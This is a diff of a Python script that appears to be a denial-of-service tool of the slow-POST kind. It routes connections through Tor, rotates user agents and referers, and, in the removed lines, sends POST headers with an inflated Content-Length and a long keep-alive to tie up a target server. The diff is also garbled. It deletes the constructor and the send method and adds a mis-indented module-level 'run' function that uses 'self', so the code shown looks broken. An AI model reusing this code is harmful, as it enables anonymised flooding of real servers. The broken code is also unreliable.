@@ -56,26 +56,22 @@ def useragent_list():
 
 ##################D1MOD FILE 
 ##################################################################################################
-	
-    def __init__(self, host, port, tor):
-        Thread.__init__(self)
-        self.host = host
-        self.port = port
-        self.socks = socks.socksocket()
-        self.tor = tor
-        self.running = True
+def run(self):
+        while self.running:
+            while self.running:
+                try:
+                    if self.tor:
+                        self.socks.set_proxy(socks.SOCKS5, '127.0.0.1', 9150)
+                        time.sleep(1)
+                    self.socks.connect((self.host, self.port))
+                    print(term.BOL+term.UP+term.CLEAR_EOL+"Connected to host..."+ term.NORMAL)
+                    break
+                except Exception as e:
+                    print(term.BOL+term.UP+term.CLEAR_EOL+"Error connecting to host..."+ term.NORMAL)
+                    print(e)
+                    time.sleep(1)
+                    sys.exit()
 
-    def _send_http_post(self, pause=10):
-        global stop_now
-
-        self.socks.send("POST / HTTP/1.1\r\n"
-                        "Host: %s\r\n"
-                        "User-Agent: %s\r\n"
-                        "Connection: keep-alive\r\n"
-                        "Keep-Alive: 900\r\n"
-                        "Content-Length: 10000\r\n"
-                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" %
-                        (self.host, random.choice(useragents)))
 		
 # generates a referer array
 def referer_list():
